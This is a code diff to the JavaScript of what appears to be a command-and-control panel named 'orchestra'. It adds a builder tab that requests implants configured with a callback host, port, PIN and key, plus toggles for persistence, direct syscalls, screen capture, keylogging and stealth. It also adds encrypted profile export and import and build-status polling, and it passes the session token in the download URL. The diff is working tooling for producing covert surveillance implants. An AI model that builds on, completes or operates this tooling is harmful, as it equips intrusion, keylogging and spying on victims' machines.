@@ -32,7 +32,7 @@
       }
       sessionStorage.setItem("oc_token", t);
       $("login").hidden = true;
-      $("dash").hidden = false;
+      $("main-content").hidden = false;
       await refreshAgents();
       openWs();
     } catch (e) {
@@ -151,8 +151,253 @@
   $("send-btn").addEventListener("click", sendCommand);
   $("token").addEventListener("keydown", e => { if (e.key === "Enter") login(); });
 
+  const tabDash = $("tab-dash");
+  const tabBuilder = $("tab-builder");
+  const btnDash = $("tab-btn-dash");
+  const btnBuilder = $("tab-btn-builder");
+
+  btnDash.addEventListener("click", () => {
+    tabDash.hidden = false;
+    tabBuilder.hidden = true;
+    btnDash.style.fontWeight = "bold";
+    btnDash.className = "tab-btn active";
+    btnBuilder.style.fontWeight = "normal";
+    btnBuilder.className = "tab-btn";
+  });
+
+  btnBuilder.addEventListener("click", () => {
+    tabDash.hidden = true;
+    tabBuilder.hidden = false;
+    btnDash.style.fontWeight = "normal";
+    btnDash.className = "tab-btn";
+    btnBuilder.style.fontWeight = "bold";
+    btnBuilder.className = "tab-btn active";
+  });
+
+  $("btn-gen-key").addEventListener("click", () => {
+    const bytes = new Uint8Array(32);
+    crypto.getRandomValues(bytes);
+    $("build-key").value = Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
+  });
+
+  async function submitBuild() {
+    const os = $("build-os").value;
+    const arch = $("build-arch").value;
+    const host = $("build-host").value.trim();
+    const port = parseInt($("build-port").value, 10);
+    const pin = $("build-pin").value.trim();
+    const key = $("build-key").value.trim();
+    const outDir = $("build-output-dir").value.trim();
+
+    if (!host || !port || !pin || !key) {
+      alert("Please fill in all connection details and encryption key.");
+      return;
+    }
+
+    const req = {
+      os, arch, 
+      features: {
+        persistence: $("feat-persistence").checked,
+        syscalls: $("feat-syscalls").checked,
+        screencap: $("feat-screencap").checked,
+        keylog: $("feat-keylog").checked,
+        stealth: $("feat-stealth").checked,
+      },
+      host, port, pin, key,
+      output_dir: outDir ? outDir : null
+    };
+
+    $("build-download").hidden = true;
+    $("btn-build").disabled = true;
+    const logEl = $("build-log");
+    logEl.textContent = "Starting build...\n";
+    logEl.className = "";
+
+    try {
+      const res = await fetch("/api/build", {
+        method: "POST",
+        headers: headers(),
+        body: JSON.stringify(req)
+      });
+      
+      const resData = await res.json();
+      
+      if (!res.ok) {
+        logEl.textContent += "Error: " + (resData.error || res.statusText);
+        logEl.className = "err";
+      } else {
+        logEl.textContent += "Build complete.\nJob ID: " + resData.job_id + "\n";
+        logEl.textContent += resData.log || "";
+        window.checkBuildStatus(resData.job_id);
+      }
+    } catch (e) {
+      logEl.textContent += "\nRequest failed: " + e.message;
+      logEl.className = "err";
+    } finally {
+      $("btn-build").disabled = false;
+    }
+  }
+
+  $("btn-build").addEventListener("click", submitBuild);
+
   if (token) {
     $("token").value = token;
     login();
   }
+
+  // Profile Encryption / Decryption using WebCrypto AES-GCM
+  async function getCryptoKey(passphrase, salt) {
+    const enc = new TextEncoder();
+    const keyMaterial = await window.crypto.subtle.importKey(
+      "raw", enc.encode(passphrase), { name: "PBKDF2" }, false, ["deriveBits", "deriveKey"]
+    );
+    return window.crypto.subtle.deriveKey(
+      { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
+      keyMaterial,
+      { name: "AES-GCM", length: 256 },
+      true, ["encrypt", "decrypt"]
+    );
+  }
+
+  function uint8ArrayToBase64(bytes) {
+    let binary = "";
+    for (let i = 0; i < bytes.byteLength; i++) {
+        binary += String.fromCharCode(bytes[i]);
+    }
+    return window.btoa(binary);
+  }
+
+  function base64ToUint8Array(base64) {
+    const binaryStr = window.atob(base64);
+    const bytes = new Uint8Array(binaryStr.length);
+    for (let i = 0; i < binaryStr.length; i++) {
+        bytes[i] = binaryStr.charCodeAt(i);
+    }
+    return bytes;
+  }
+
+  $("btn-export-profile").addEventListener("click", async () => {
+    const passphrase = $("profile-passphrase").value;
+    if (!passphrase) { alert("Please provide a passphrase to encrypt the profile."); return; }
+
+    const profileData = {
+      os: $("build-os").value,
+      arch: $("build-arch").value,
+      features: {
+        persistence: $("feat-persistence").checked,
+        syscalls: $("feat-syscalls").checked,
+        screencap: $("feat-screencap").checked,
+        keylog: $("feat-keylog").checked,
+        stealth: $("feat-stealth").checked,
+      },
+      host: $("build-host").value.trim(),
+      port: parseInt($("build-port").value, 10) || 443,
+      pin: $("build-pin").value.trim(),
+      key: $("build-key").value.trim(),
+      output_dir: $("build-output-dir").value.trim() || undefined,
+    };
+
+    try {
+      const salt = window.crypto.getRandomValues(new Uint8Array(16));
+      const iv = window.crypto.getRandomValues(new Uint8Array(12));
+      const key = await getCryptoKey(passphrase, salt);
+      const encodedData = new TextEncoder().encode(JSON.stringify(profileData));
+      const ciphertext = await window.crypto.subtle.encrypt(
+        { name: "AES-GCM", iv: iv }, key, encodedData
+      );
+
+      const payload = {
+        salt: uint8ArrayToBase64(salt),
+        iv: uint8ArrayToBase64(iv),
+        ciphertext: uint8ArrayToBase64(new Uint8Array(ciphertext))
+      };
+
+      const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "orchestra_profile.enc.json";
+      a.click();
+    } catch (e) {
+      alert("Encryption failed: " + e.message);
+    }
+  });
+
+  $("btn-import-profile").addEventListener("click", async () => {
+    const fileFile = $("profile-file").files[0];
+    if (!fileFile) { alert("Please select a profile file."); return; }
+    
+    const passphrase = $("profile-passphrase").value;
+    // We allow plaintext profiles if no passphrase and it's raw JSON
+    
+    try {
+      const text = await fileFile.text();
+      let data = JSON.parse(text);
+      if (data.ciphertext) {
+         if (!passphrase) { alert("This profile is encrypted. Provide a passphrase."); return; }
+         const salt = base64ToUint8Array(data.salt);
+         const iv = base64ToUint8Array(data.iv);
+         const ciphertext = base64ToUint8Array(data.ciphertext);
+         const cryptoKey = await getCryptoKey(passphrase, salt);
+         
+         const decrypted = await window.crypto.subtle.decrypt(
+           { name: "AES-GCM", iv: iv }, cryptoKey, ciphertext
+         );
+         data = JSON.parse(new TextDecoder().decode(decrypted));
+      }
+      
+      if (data.os) $("build-os").value = data.os;
+      if (data.arch) $("build-arch").value = data.arch;
+      if (data.features) {
+        $("feat-persistence").checked = !!data.features.persistence;
+        $("feat-syscalls").checked = !!data.features.syscalls;
+        $("feat-screencap").checked = !!data.features.screencap;
+        $("feat-keylog").checked = !!data.features.keylog;
+        $("feat-stealth").checked = !!data.features.stealth;
+      }
+      if (data.host) $("build-host").value = data.host;
+      if (data.port) $("build-port").value = data.port;
+      if (data.pin) $("build-pin").value = data.pin;
+      if (data.key) $("build-key").value = data.key;
+      if (data.output_dir !== undefined) $("build-output-dir").value = data.output_dir;
+      
+      alert("Profile loaded successfully.");
+    } catch (e) {
+      alert("Decryption or loading failed: " + e.message);
+    }
+  });
 })();
+
+window.checkBuildStatus = async function(job_id) {
+    const logEl = document.getElementById("build-log");
+    try {
+        const res = await fetch("/api/build/status/" + job_id, { headers: { ...headers() }});
+        if (!res.ok) {
+            logEl.textContent += "\nError fetching status: " + res.statusText;
+            document.getElementById("btn-build").disabled = false;
+            return;
+        }
+        const data = await res.json();
+        const currentLog = data.log || "";
+        if (currentLog) {
+            logEl.textContent = "Job ID: " + job_id + "\n" + currentLog;
+        }
+        
+        if (data.status === "Queued" || data.status === "Running") {
+            setTimeout(() => window.checkBuildStatus(job_id), 2000);
+        } else {
+            document.getElementById("btn-build").disabled = false;
+            if (data.status === "Completed") {
+                logEl.className = "ok";
+                const dload = document.getElementById("build-download");
+                dload.hidden = false;
+                document.getElementById("build-download-link").href = "/api/build/" + job_id + "/download?token=" + encodeURIComponent(token);
+            } else {
+                logEl.className = "err";
+            }
+        }
+    } catch (e) {
+        logEl.textContent += "\nStatus check failed: " + e.message;
+        document.getElementById("btn-build").disabled = false;
+    }
+};
+
